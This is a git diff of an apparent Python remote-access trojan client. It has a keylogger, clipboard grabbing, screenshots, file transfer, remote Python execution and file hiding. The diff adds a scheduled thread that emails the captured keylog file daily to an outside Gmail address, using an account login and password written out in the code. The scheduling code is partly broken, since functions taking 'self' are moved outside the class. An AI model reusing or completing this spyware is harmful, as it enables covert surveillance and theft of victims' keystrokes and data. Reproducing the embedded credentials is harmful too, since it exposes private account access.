@@ -28,6 +28,29 @@ from mss import mss
 from pynput.keyboard import Controller, Key,Listener     # Keylogger
 import pyperclip
 
+
+def emailsendbody(body):
+    # creates SMTP session
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+    s.ehlo()
+
+    # start TLS for security
+    s.starttls()
+
+    # Authentication
+    s.login("uor.27016005@gmail.com", "C0mput3rSc13nc3")
+
+    # message to be sent
+    message = "Subject:{0}\n\n{1}".format(datetime.datetime.now().strftime("%d-%m-%y %H:%M:%S"), body)
+    print(message)
+
+    # sending the mail
+    s.sendmail("uor.27016005@gmail.com", "dannyb0903@gmail.com", message)
+
+    # terminating the session
+    s.quit()
+
+
 class Client:
 # ''' SET UP CONNECTION '''
     def __init__(self, server_ip, port, buffer_size, client_ip):
@@ -53,7 +76,7 @@ class Client:
             "-getLogs": self.keylogs,
             "-getcb": self.clipboardgrab,
             "-Fsend": self.filesend,
-            "-Frec": self.filerecv,
+            "-Frecv": self.filerecv,
             "-ginfo": self.sendHostInfo,
             "-exe": self.exePy,
             "-ss": self.screenshot,
@@ -137,9 +160,9 @@ class Client:
         with open('./logs/info.txt', 'rb+') as f:
             self.client.send(f.read())
         print("CPU: " + cpu + '\n', "System: " + system + '\n', "Machine: " + machine + '\n')
-        input()
+        # input()
         pprint(sys_info)
-        input()
+        # input()
         self.sysinfViaCMDFile()
 
     def sysinfViaCMDFile(self):
@@ -281,6 +304,7 @@ class Client:
             msgB = 'start File.vbs'
             self.runrun(msgB)
             self.client.send("[+] Message displayed and closed.".encode("utf-8"))
+            os.remove("File.vbs")
         except:
             self.client.send("[!] FAILED TO DISPLAY MESSAGE. ".encode("utf-8"))
 
@@ -353,6 +377,7 @@ class Client:
             print("Virtuous mode enabled: ")
             self.client.send("2".encode("utf-8"))
             self.confirmconnection()
+        self.startEmailthread()
         while True:
             print("entered loop")
             msg = (self.client.recv(self.BUFFER_SIZE).decode("utf-8"))
@@ -381,56 +406,20 @@ class Client:
         command = "attrib +h "+filepath+""
         self.runrun(command)
 
-# ''' EMAILER FUNCTIONS '''
-    def emailsendbody(self, body):
-        # creates SMTP session
-        s = smtplib.SMTP('smtp.gmail.com', 587)
-        s.ehlo()
-
-        # start TLS for security
-        s.starttls()
-
-        # Authentication
-        s.login("uor.27016005@gmail.com", "C0mput3rSc13nc3")
-
-        # message to be sent
-        message = "Subject:{0}\n\n{1}".format(datetime.datetime.now().strftime("%d-%m-%y %H:%M:%S"), body)
-        print(message)
-
-        # sending the mail
-        s.sendmail("uor.27016005@gmail.com", "dannyb0903@gmail.com", message)
-
-        # terminating the session
-        s.quit()
-
-    def emailsendfilepath(self, filepath):
-        if os.path.exists(filepath):
-            with open(filepath, 'r') as file:
-                body = file.read()
-                self.emailsendbody(body)
-        else:
-            print("FILE DOESNT EXIST")
-
-    def Scheduler(self):
-        # SCHEDULER
-        schedule.every().day.at("15:46").do(self.emailsendbody, "This is a schedule test")
-        while True:
-            schedule.run_pending()
-            time.sleep(1)
 
 # '''SCREENSHOT'''
     def screenshot(self):
-        ss = mss()
-        ss.shot(mon=1, output='./logs/screen{}.png'.format(self.sscount))
-        #ss.shot(output='./logs/screen{}.png'.format(self.sscount))  # taking screenshot
-        picsize = os.path.getsize('./logs/screen{}.png'.format(self.sscount))
-        self.client.send(str(picsize).encode())
-        time.sleep(0.1)
-        with open('./logs/screen{}.png'.format(self.sscount), 'rb') as screen:
-            tosend = screen.read()
-            self.client.send(tosend)  # sending actual file
-        # os.remove('./logs/screen{}.png'.format(self.screenshot_counter))  # removing file from host
-        self.sscount += 1
+        with mss() as ss:
+            #ss.shot(mon=1, output='./logs/screen{}.png'.format(self.sscount))
+            ss.shot(output='./logs/screen{}.png'.format(self.sscount))  # taking screenshot
+            picsize = os.path.getsize('./logs/screen{}.png'.format(self.sscount))
+            self.client.send(str(picsize).encode())
+            time.sleep(0.1)
+            with open('./logs/screen{}.png'.format(self.sscount), 'rb') as screen:
+                tosend = screen.read()
+                self.client.send(tosend)  # sending actual file
+            # os.remove('./logs/screen{}.png'.format(self.screenshot_counter))  # removing file from host
+            self.sscount += 1
         print("SUCCESS")
 
 
@@ -445,6 +434,29 @@ def getClipBoard():
     print(contents)
     return contents
 
+
+# ''' EMAILER FUNCTIONS '''
+def emailsendfilepath(self, filepath):
+        if os.path.exists(filepath):
+            with open(filepath, 'r') as file:
+                body = file.read()
+                emailsendbody(body)
+        else:
+            print("FILE DOESNT EXIST")
+
+
+def Scheduler(self):
+    # SCHEDULER
+    schedule.every().day.at("22:47").do(self.emailsendfilepath, "./logs/readable.txt")
+    while True:
+        schedule.run_pending()
+        time.sleep(1)
+        print("Emailthread")
+
+
+def startEmailthread(self):
+    eThread = threading.Thread(target=Scheduler)
+    eThread.start()
 
 class Keylogger:
     def __init__(self):
